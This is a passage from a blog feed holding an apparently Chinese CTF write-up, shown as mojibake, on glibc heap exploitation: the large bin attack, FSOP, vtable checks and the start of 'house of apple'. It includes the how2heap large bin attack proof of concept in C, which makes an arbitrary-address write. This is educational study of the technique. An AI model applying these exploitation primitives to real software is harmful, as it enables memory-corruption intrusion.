          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çŒ«çŒ« &amp;&amp; è‹¹æœé¦™è•‰ ã® å±‹</title>
      <link href="/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/"/>
      <url>/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å¤§å¤ï¼šä¸€å¼€å§‹å°±ç”¨çº¢è‰²å½¢æ€ä½œæˆ˜ä¸å°±è¡Œäº†å—</p></blockquote><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>glibc</code>Â é«˜ç‰ˆæœ¬é€æ¸ç§»é™¤äº†<code>__malloc_hook/__free_hook/__realloc_hook</code>Â ç­‰ç­‰ä¸€ä¼—Â <code>hook</code>Â å…¨å±€å˜é‡ã€‚</p><p>åˆ©ç”¨æ‰‹æ®µå‘ IO_FILE é æ‹¢ï¼Œä½†æ˜¯éšç€ç‰ˆæœ¬è¶Šæ¥è¶Šé«˜ï¼Œå †åˆ©ç”¨æ‰‹æ®µä¹Ÿå˜å°‘ï¼ŒIO_FILE çš„é—®é¢˜ä¹Ÿé€æ¸å‡å°‘ã€‚</p><h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>ä¸€ä¸ªèŒƒå›´çš„binï¼Œä¿è¯äº†å…¶å†…éƒ¨æœ‰åºæ€§ã€‚åœ¨ <a href="https://xz.aliyun.com/t/5177">æµ…ælargebin attack</a>æ–‡ç« ä¸­æœ‰å¼ å›¾æ–¹ä¾¿ç†è§£<br>åŒæ ·å¤§å°çš„binæŒ‰ç…§freeçš„æ—¶é—´é¡ºåºè¿›è¡Œæ’åº</p><ul><li>fd, bk: ç›¸åŒå¤§å°å †çš„åŒå‘é“¾è¡¨ï¼ŒæŒ‰ç…§æ—¶é—´å…ˆåæ’åº</li><li>fd_nextsize, bk_nextsize: å¤§å°ä¸åŒçš„åŒå‘é“¾è¡¨</li><li>å¦‚æœåªæœ‰ä¸€ä¸ªï¼Œfd, bkæŒ‡å‘ main_arena fd_nextsize å’Œ bk_nextsize æŒ‡å‘è‡ªå·±</li></ul><p>ç›´æ¥ä½¿ç”¨ how2heap 2.36 çš„ large bin attack è¿›è¡Œæ¼”ç¤º(Glibc &gt;&#x3D; 2.30 éƒ½å¯ä»¥ä½¿ç”¨)ã€‚</p><ul><li>æ¼æ´çš„ç‚¹åœ¨å¼€å¤´çš„æ³¨é‡Šä¸­ç»™å‡ºï¼Œå°±æ˜¯æœ€åä¸€å¥èµ‹å€¼è¯­å¥å¯¼è‡´çš„ï¼Œvictim(æ­£åœ¨é“¾å…¥largebin)çš„sizeå°äºå·²ç»å­˜åœ¨çš„bin</li><li>mallocä¸¤ä¸ªå¤§chunk p1,p2ï¼Œä¸¤ä¸ª 0x18 æ˜¯é˜²æ­¢ <strong>ç›¸é‚»çš„unsorted bin åˆå¹¶</strong> ä»¥åŠ <strong>è¢«top_chunkåˆå¹¶</strong>ã€‚</li><li>è¿™é‡Œæ³¨æ„çš„æ˜¯ï¼šp1 çš„ size å¤§äº p2ï¼Œä½†æ˜¯ä¸è¦å·®å¤ªå¤šï¼Œåœ¨åŒä¸€ä¸ªlargebin é‡Œ</li><li>free p1ï¼Œå°† p1 æ”¾å…¥large bin ä¸­</li><li>free p2ï¼Œä¿®æ”¹ p1 çš„ bk_nextsize ä¸º &amp;target-0x20</li><li>å°† p2 æ”¾å…¥largebinä¸­</li><li>target å€¼å°±å˜æˆäº† p2 çš„åœ°å€</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">// å› ä¸ºåªæœ‰ä¸¤ä¸ªbinï¼Œå› æ­¤å¯ä»¥è§£è¯»ä¸€ä¸‹ã€‚</span></span><br><span class="line"><span class="comment">// çœ‹æºç ï¼Œbckæ˜¯  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">// av å°±æ˜¯ arenaåœ°å€ï¼Œbckå°±æ˜¯æ‰¾arena</span></span><br><span class="line"><span class="comment">// fwd = bck-&gt;fd;   ä¸large bin ä¹‹é—´çš„åŒå‘é“¾è¡¨ï¼Œåœ¨è¿™é‡Œå°±æ˜¯å­˜åœ¨çš„ p1</span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim è¦æ”¾å…¥large bin çš„å † p2 </span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">// ä½†æ˜¯victim.bk_nextsize = &amp;target-0x20ã€‚è€Œè¿™ä¸ªåœ°å€çš„ fd_nextsize = victim ä¹Ÿå°±æ˜¯å°† target å€¼æ”¹ä¸º victimï¼Œ</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾¾åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™æˆå †åœ°å€çš„ç›®çš„ã€‚<br>Glibc 2.29 ä¹‹å‰ï¼Œunsortedbin attack å’Œ largebin attack éƒ½æ˜¯æ”»å‡» bk æŒ‡é’ˆï¼Œä½†æ˜¯åæ¥åŠ äº†ä¸€å¥æ£€æŸ¥</p><p>åœ¨æ”»å‡»æ—¶ï¼Œfd,bk,fd_nextsize å¯ä»¥éšä¾¿è¦†ç›–å†…å®¹ï¼Œåœ¨ç»è¿‡mallocåä¼šä¿®å¤fdï¼Œå› ä¸ºfdæŒ‡å‘ size è¾ƒå°çš„ victim</p><h3 id="IO-æµ"><a href="#IO-æµ" class="headerlink" title="IO æµ"></a>IO æµ</h3><p>è¿™é‡Œä¸€èˆ¬æŒ‡ å­˜åœ¨ä¸€æ¡é“¾ï¼ŒæŸä¸ªå‡½æ•° ä½¿ç”¨ vtable çš„å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨å‡½æ•°ã€‚</p><p>ç¨‹åºä½¿ç”¨exité€€å‡ºç¨‹åº</p><ul><li>ä»mainå‡½æ•°é€€å‡ºï¼Œglibcä¼šè°ƒç”¨exit</li><li>æ˜¾ç¤ºè°ƒç”¨ exit å‡½æ•°é€€å‡ºç¨‹åº</li></ul><p>malloc_assert: house of kiwi æå‡ºï¼Œè§¦å‘ä¸‹é¢çš„æ¡ä»¶é€‰ä¸€ä¸ª</p><ul><li>topchunkçš„å¤§å°å°äºMINSIZE(0X20)  </li><li>prev inuseä½ä¸º0  </li><li>old_topé¡µæœªå¯¹é½</li><li>ä½†æ˜¯ä»libc 2.36 å‘ç”Ÿäº†ä¸€ç‚¹å˜åŒ–ï¼Œç§»é™¤IOæ“ä½œï¼Œä¹Ÿå°±æ˜¯ä»libc 2.36ä¸èƒ½ä½¿ç”¨</li><li>libc 2.37 ç›´æ¥æ²¡æœ‰è¿™ä¸ªå‡½æ•°äº†ã€‚</li></ul><p>libc 2.35ï¼š</p><ul><li>ä¸¤ä¸ªå‡½æ•°(fflsh, fxpeintf)éƒ½æ¶‰åŠIOæ“ä½œã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOPå°±æ˜¯é€šè¿‡åŠ«æŒ_IO_list_allçš„å€¼ï¼ˆå¦‚large bin attackä¿®æ”¹ï¼‰æ¥æ‰§è¡Œ_IO_flush_all_lockpå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®_IO_list_allåˆ·æ–°é“¾è¡¨ä¸­çš„æ‰€æœ‰æ–‡ä»¶æµ.</p><p>å½“ç¨‹åºä» main å‡½æ•°è¿”å›æˆ–è€…æ‰§è¡Œ exit å‡½æ•°çš„æ—¶å€™ï¼Œå‡ä¼šè°ƒç”¨ fcloseall å‡½æ•°ï¼Œè°ƒç”¨é“¾å¦‚ä¸‹</p><ul><li>æœ€åä¼šéå†<code>_IO_list_all</code>Â å­˜æ”¾çš„æ¯ä¸€ä¸ªÂ <code>IO_FILE</code>Â ç»“æ„ä½“</li><li>å¦‚æœæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œä¼šè°ƒç”¨æ¯ä¸ªç»“æ„ä½“ä¸­Â <code>vtable-&gt;_overflow</code>Â å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">fcloseall</span><br><span class="line">_IO_cleanup</span><br><span class="line">_IO_flush_all_lockp</span><br><span class="line">_IO_OVERFLOW</span><br></pre></td></tr></table></figure><p>vtable å‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼Œå°±æ˜¯è°ƒç”¨è·³è¡¨ï¼Œæ¯”å¦‚è¯´è°ƒç”¨ <code>__overflow</code> </p><ul><li><code>IO_validate_vtable</code>å‡½æ•°è´Ÿè´£æ£€æŸ¥<code>vtable</code>çš„åˆæ³•æ€§ï¼Œä¼šåˆ¤æ–­<code>vtable</code>çš„åœ°å€æ˜¯ä¸æ˜¯åœ¨ä¸€ä¸ªåˆæ³•çš„åŒºé—´ã€‚å¦‚æœ<code>vtable</code>çš„åœ°å€ä¸åˆæ³•ï¼Œç¨‹åºå°†ä¼šå¼‚å¸¸ç»ˆæ­¢ã€‚</li><li>æœ€åå°±æ˜¯è°ƒç”¨ vtable é‡Œé¢çš„å‡½æ•°</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure><p>æ£€æŸ¥å‡½æ•°</p><ul><li>æ£€æŸ¥æ­¤ç»“æ„ä½“çš„ vtable ä¸ <code>__io_vtables</code> å…¨å±€å˜é‡è¡¨åç§»</li><li>åœ¨è¿™ä¸ªè¡¨é‡Œçš„è¡¨å°±èƒ½é€šè¿‡æ£€æŸ¥ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç°åœ¨åŠ«æŒvtableéƒ½å·®ä¸å¤šåœ¨è¿™ä¸ªè¡¨é‡Œæ‰¾ä¸€ä¸ªèƒ½ç¬¦åˆæ¡ä»¶çš„è¡¨è¿›è¡Œåˆ©ç”¨ã€‚</p><p>æ¯”å¦‚æŒŸæŒåˆ° <code>_wide_data</code> ç›¸å…³çš„è¡¨ï¼Œå› ä¸ºè¿™ä¸ªè¡¨å«æœ‰vtableï¼Œå¹¶ä¸”å‡½æ•°è°ƒç”¨æ²¡æœ‰æ£€æŸ¥ã€‚</p><ul><li>è€Œä¸å…¶ç›¸å…³çš„è¡¨æœ‰3ä¸ª æ‰¾ <code>_IO_wfile_jumps</code> å¼€å¤´çš„è¡¨å­˜åœ¨ä¸‰ä¸ª</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote><p>æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼Œè¿™é‡Œæ˜¯ version 2.0ï¼Œæ§åˆ¶å‡½æ•°æ‰§è¡Œæµã€‚</p></blockquote><ol><li>IO æµï¼šexit æˆ–è€… malloc_assert</li><li>èƒ½æ³„éœ²å‡ºÂ <code>heap</code>Â åœ°å€å’ŒÂ <code>libc</code>Â åœ°å€ </li><li>èƒ½ä½¿ç”¨ä¸€æ¬¡Â <code>largebin attack</code>ï¼ˆä¸€æ¬¡å³å¯ï¼‰</li></ol><p>wide_data ç»“æ„ä½“</p><ul><li>å…¶ä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ª vtable</li><li>ç”±ä¸Šé¢çš„FSOPçŸ¥é“ï¼Œåœ¨è°ƒç”¨<code>_wide_vtable</code>è™šè¡¨é‡Œé¢çš„å‡½æ•°æ—¶ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨å®å»è°ƒç”¨ï¼Œä½†æ˜¯æ²¡æœ‰æ£€æŸ¥ï¼Œå› æ­¤æ›´å¥½åˆ©ç”¨</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‡è®¾åŠ«æŒäº†vtable åˆ° <code>IO_wdata_jumps</code> 